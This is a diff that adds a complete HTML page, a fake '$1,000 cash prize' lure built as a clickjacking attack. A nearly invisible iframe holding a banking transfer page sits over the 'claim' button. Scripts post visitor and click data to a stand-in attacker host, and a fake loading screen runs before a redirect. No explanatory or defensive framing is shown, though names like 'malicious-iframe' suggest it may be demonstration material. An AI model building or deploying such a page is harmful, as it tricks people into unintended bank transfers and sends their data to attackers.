@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! You've Won a Prize!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            background: white;
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 600px;
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            color: #667eea;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        .prize-text {
+            font-size: 1.3em;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .claim-button {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 20px 60px;
+            font-size: 1.5em;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.4);
+            transition: transform 0.3s ease;
+            position: relative;
+            z-index: 2;
+        }
+
+        .claim-button:hover {
+            transform: scale(1.05);
+        }
+
+        .sparkles {
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .malicious-iframe {
+            position: absolute;
+            width: 600px;
+            height: 400px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0.01;
+            z-index: 10;
+            border: none;
+            pointer-events: auto;
+        }
+
+        .iframe-overlay-trigger {
+            position: absolute;
+            width: 280px;
+            height: 70px;
+            top: 58%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9;
+            cursor: pointer;
+        }
+
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 2em;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="targetFrame" class="malicious-iframe" src="https://secure-banking.example.com/transfer"></iframe>
+    
+    <div class="container">
+        <div class="sparkles">✨🎁✨</div>
+        <h1>CONGRATULATIONS!</h1>
+        <p class="prize-text">
+            You have been selected as our lucky winner!<br>
+            Click below to claim your <strong>$1,000 CASH PRIZE</strong><br>
+            This offer expires in 5 minutes!
+        </p>
+        <button class="claim-button" id="claimBtn">CLAIM MY PRIZE NOW!</button>
+        <div class="iframe-overlay-trigger" id="overlayTrigger"></div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div>Processing your prize... Please wait...</div>
+    </div>
+
+    <script>
+        const iframe = document.getElementById('targetFrame');
+        const claimBtn = document.getElementById('claimBtn');
+        const overlayTrigger = document.getElementById('overlayTrigger');
+        const loadingScreen = document.getElementById('loadingScreen');
+        
+        let clickCount = 0;
+        const API_KEY = 'sk_live_51HqT8KLmNvQxPz9X4bC7yR2';
+        const WEBHOOK_URL = 'https://attacker-collect.darkweb.onion/capture';
+
+        function adjustIframePosition() {
+            const button = claimBtn.getBoundingClientRect();
+            iframe.style.top = (button.top - 100) + 'px';
+            iframe.style.left = (button.left - 150) + 'px';
+        }
+
+        window.addEventListener('load', function() {
+            setTimeout(adjustIframePosition, 500);
+            trackVisitor();
+        });
+
+        window.addEventListener('resize', adjustIframePosition);
+
+        function trackVisitor() {
+            const data = {
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer,
+                apiKey: API_KEY
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(e => console.log('Tracking initiated'));
+        }
+
+        claimBtn.addEventListener('click', function(e) {
+            clickCount++;
+            logClickEvent(e);
+        });
+
+        overlayTrigger.addEventListener('click', function(e) {
+            clickCount++;
+            logClickEvent(e);
+            showLoadingAndRedirect();
+        });
+
+        function logClickEvent(event) {
+            const clickData = {
+                x: event.clientX,
+                y: event.clientY,
+                count: clickCount,
+                timestamp: Date.now(),
+                key: API_KEY
+            };
+            
+            fetch(WEBHOOK_URL + '/clicks', {
+                method: 'POST',
+                body: JSON.stringify(clickData)
+            }).catch(e => {});
+        }
+
+        function showLoadingAndRedirect() {
+            loadingScreen.style.display = 'flex';
+            
+            setTimeout(function() {
+                window.location.href = 'confirmation.html?session=' + btoa(API_KEY);
+            }, 3000);
+        }
+
+        iframe.addEventListener('load', function() {
+            setTimeout(function() {
+                iframe.style.opacity = '0.01';
+                adjustIframePosition();
+            }, 100);
+        });
+
+        document.addEventListener('mousemove', function(e) {
+            const rect = overlayTrigger.getBoundingClientRect();
+            if (e.clientX >= rect.left && e.clientX <= rect.right &&
+                e.clientY >= rect.top && e.clientY <= rect.bottom) {
+                document.body.style.cursor = 'pointer';
+            }
+        });
+    </script>
+</body>
+</html>
